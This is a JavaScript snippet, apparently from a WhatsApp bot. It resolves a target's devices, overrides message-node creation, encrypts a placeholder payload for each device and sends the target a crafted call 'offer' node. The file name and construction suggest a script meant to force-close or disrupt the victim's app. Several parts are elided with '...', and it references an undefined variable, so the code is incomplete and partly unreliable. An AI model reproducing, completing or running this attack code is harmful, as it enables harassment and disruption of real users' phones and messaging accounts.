// callfc.js
async function AplynCallnode(rizkyyy, target) {
...
let dev = await rizkyyy.getUSyncDevices([target], false, false);  
let rec = dev.map(d => `${d.user}:${d.device || ''}@s.whatsapp.net`);  
await rizkyyy.assertSessions(rec);  
let sync = (() => {  
    let map = {};  
    return {  
        lock(id, fn) {  
...
let origCreate = rizkyyy.createParticipantNodes?.bind(ctx);  
let origEncode = rizkyyy.encodeWAMessage?.bind(ctx);  

rizkyyy.createParticipantNodes = async (targets, msg, attrs, dsm) => {  
    let patched = await (rizkyyy.patchMessageBeforeSending?.(msg, targets) ?? msg);  
    ...
    let nodes = await Promise.all(  
        blocks.map(async ({ jid, message }) => {  
            ...
            return sync.lock(jid, async () => {  
                let enc = await rizkyyy.signalRepository.encryptMessage({  
                    jid,  
                    data: payload  
                });  
...
let { nodes: route, shouldIncludeDeviceIdentity } =  
    await rizkyyy.createParticipantNodes(  
        rec,  
        { conversation: "Y" },  
        { count: "0" }  
    );  
...
let callNode = {  
    ...
    attrs: {  
        to: target,  
        id: rizkyyy.generateMessageTag(),  
        from: rizkyyy.user.id  
    },  
    content: [  
        {  
            tag: "offer",  
                ...
                shouldIncludeDeviceIdentity  
                    ? {  
                        ...
                        content: encodeSignedDeviceIdentity(  
                            rizkyyy.authState.creds.account,   
                            true  
                        )  
                    }  
                    : null  
...
await rizkyyy.sendNode(callNode);
